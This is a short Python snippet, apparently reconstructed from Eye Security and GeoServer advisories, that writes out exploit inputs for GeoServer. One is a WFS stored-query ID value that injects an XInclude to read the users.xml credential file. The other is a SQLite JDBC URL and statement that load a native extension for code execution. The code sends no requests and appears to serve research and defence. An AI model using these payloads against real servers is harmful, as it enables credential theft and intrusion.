# Reconstructed from Eye Security and GeoServer advisories; no requests are sent.
# The query ID closes the unescaped ResourceId attribute in the server template.
query = {
    "service": "WFS", "version": "2.0.0", "request": "GetFeature",
    "storedquery_id": "urn:ogc:def:query:OGC-WFS::GetFeatureById",
    "ID": """'/><fes:PropertyName xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///opt/geoserver/data_dir/security/usergroup/default/users.xml" parse="text"/></fes:PropertyName><fes:ResourceId rid='""",
}
# Reconstructed JDBC connection setting and DML property statement, not an upload tool.
connection_url = "jdbc:sqlite:/tmp/security.db?enable_load_extension=true"
dml = "users=SELECT load_extension('/tmp/native_extension.so')"
